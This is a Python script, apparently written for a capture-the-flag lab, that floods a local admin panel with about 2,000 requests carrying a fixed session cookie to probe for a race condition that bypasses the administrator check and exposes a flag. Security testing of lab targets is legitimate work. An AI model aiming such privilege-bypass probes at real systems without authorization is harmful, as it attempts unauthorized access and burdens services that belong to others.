import requests
import time
import asyncio
import aiohttp

# Configuration
base_url = "http://127.0.0.1:32992"
admin_endpoint = f"{base_url}/admin_panel"
cookies = {"session": "ahYINfgSeZIuIVlIHpUK5jZSk4ahE5y7ZFvZds3KuA8"}

# Store unique responses
found_responses = []


async def make_async_request(session, request_id, method="GET"):
    """Make a single request asynchronously."""
    try:
        if method == "GET":
            async with session.get(admin_endpoint, cookies=cookies, timeout=aiohttp.ClientTimeout(total=5)) as response:
                text = await response.text()
                status = response.status
        else:
            async with session.post(admin_endpoint, cookies=cookies, timeout=aiohttp.ClientTimeout(total=5)) as response:
                text = await response.text()
                status = response.status
        
        # Check for success indicators
        is_anomaly = False
        if status == 200:
            if "Only administrator users" not in text and len(text) > 200:
                is_anomaly = True
        
        has_flag = "FLAG" in text.upper() or "flag{" in text.lower()
        
        return {
            "request_id": request_id,
            "status": status,
            "length": len(text),
            "method": method,
            "is_anomaly": is_anomaly,
            "has_flag": has_flag,
            "preview": text[:400] if (is_anomaly or has_flag) else ""
        }
        
    except Exception as e:
        return {
            "request_id": request_id,
            "error": str(e)
        }


print("=" * 70)
print("TOCTOU RACE CONDITION TEST - /admin_panel")
print("=" * 70)

# Test 1: Baseline - single request
print("\n[TEST 1] Baseline single request...")
base_resp = requests.get(admin_endpoint, cookies=cookies, timeout=5)
print(f"Status: {base_resp.status_code} | Length: {len(base_resp.text)}B")
base_preview = base_resp.text[:300].replace('\n', ' ')
print(f"Response snippet: {base_preview}...")

# Test 2: Rapid sequential requests (no threading)
print("\n[TEST 2] Rapid sequential requests (200 requests)...")
seq_start = time.time()
anomaly_found = False
for i in range(200):
    resp = requests.get(admin_endpoint, cookies=cookies, timeout=5)
    
    # Check for anomalies
    if resp.status_code == 200 and "Only administrator users" not in resp.text:
        if len(resp.text) > 200:  # Likely different content
            print(f"\n[!] ANOMALY at request {i}")
            print(f"    Status: {resp.status_code} | Length: {len(resp.text)}")
            print(f"    Response: {resp.text[:500]}")
            found_responses.append({"id": i, "response": resp.text})
            anomaly_found = True
            break
    
    # Check for flag
    if "FLAG" in resp.text.upper():
        print(f"\n[!!!] FLAG FOUND at request {i}")
        print(resp.text)
        found_responses.append({"id": i, "flag": resp.text})
        anomaly_found = True
        break
    
    if i % 50 == 0:
        print(f"  Progress: {i}/200")

seq_elapsed = time.time() - seq_start
print(f"  Completed in {seq_elapsed:.2f}s ({200/seq_elapsed:.1f} req/s)")

# Test 3: Ultra-rapid fire (minimal timing - checking for race condition window)
print("\n[TEST 3] Ultra-rapid fire (500 requests, minimal delay)...")
rapid_start = time.time()
for i in range(500):
    resp = requests.get(admin_endpoint, cookies=cookies, timeout=3)
    
    if resp.status_code == 200 and "Only administrator users" not in resp.text:
        if len(resp.text) > 200:
            print(f"\n[!] ANOMALY at rapid request {i}")
            print(f"    Length: {len(resp.text)}")
            print(f"    Response: {resp.text[:600]}")
            found_responses.append({"id": f"rapid_{i}", "response": resp.text})
            anomaly_found = True
            break
    
    if "FLAG" in resp.text.upper():
        print(f"\n[!!!] FLAG FOUND at rapid request {i}")
        print(resp.text)
        found_responses.append({"id": f"rapid_{i}", "flag": resp.text})
        anomaly_found = True
        break

rapid_elapsed = time.time() - rapid_start
print(f"  Completed in {rapid_elapsed:.2f}s ({500/rapid_elapsed:.1f} req/s)")

# Test 4: Alternating GET/POST rapid fire
print("\n[TEST 4] Alternating GET/POST rapid fire (300 requests)...")
for i in range(300):
    method = "GET" if i % 2 == 0 else "POST"
    if method == "GET":
        resp = requests.get(admin_endpoint, cookies=cookies, timeout=3)
    else:
        resp = requests.post(admin_endpoint, cookies=cookies, timeout=3)
    
    if resp.status_code == 200 and "Only administrator users" not in resp.text:
        if len(resp.text) > 200:
            print(f"\n[!] ANOMALY at alternating {method} request {i}")
            print(f"    Length: {len(resp.text)}")
            print(f"    Response: {resp.text[:600]}")
            found_responses.append({"id": f"alt_{i}", "method": method, "response": resp.text})
            anomaly_found = True
            break
    
    if "FLAG" in resp.text.upper():
        print(f"\n[!!!] FLAG FOUND at alternating request {i}")
        print(resp.text)
        found_responses.append({"id": f"alt_{i}", "flag": resp.text})
        anomaly_found = True
        break
    
    if i % 100 == 0:
        print(f"  Progress: {i}/300")

# Test 5: Staggered burst (test timing window at different intervals)
print("\n[TEST 5] Staggered burst with timing variations (1000 requests)...")
burst_start = time.time()
for batch in range(10):
    for i in range(100):
        resp = requests.get(admin_endpoint, cookies=cookies, timeout=3)
        
        if resp.status_code == 200 and "Only administrator users" not in resp.text:
            if len(resp.text) > 200:
                print(f"\n[!] ANOMALY at batch {batch}, request {i}")
                print(f"    Length: {len(resp.text)}")
                print(f"    Response: {resp.text[:600]}")
                found_responses.append({"batch": batch, "id": i, "response": resp.text})
                anomaly_found = True
                break
        
        if "FLAG" in resp.text.upper():
            print(f"\n[!!!] FLAG FOUND at batch {batch}, request {i}")
            print(resp.text)
            found_responses.append({"batch": batch, "id": i, "flag": resp.text})
            anomaly_found = True
            break
    
    if anomaly_found:
        break
    print(f"  Batch {batch + 1}/10 completed")

burst_elapsed = time.time() - burst_start
print(f"  Completed in {burst_elapsed:.2f}s")

# Summary
print("\n" + "=" * 70)
print("SUMMARY")
print("=" * 70)

if found_responses:
    print(f"\n[!!!] Found {len(found_responses)} anomalous responses:")
    for item in found_responses:
        print(f"\n{item}")
else:
    print("\n[-] No anomalous responses detected.")
    print("[-] All requests returned the expected privilege denial.")
    print("[-] TOCTOU race condition not confirmed on this endpoint.")

print(f"\n[*] Total requests sent: 200 + 500 + 300 + 1000 = 2000+")

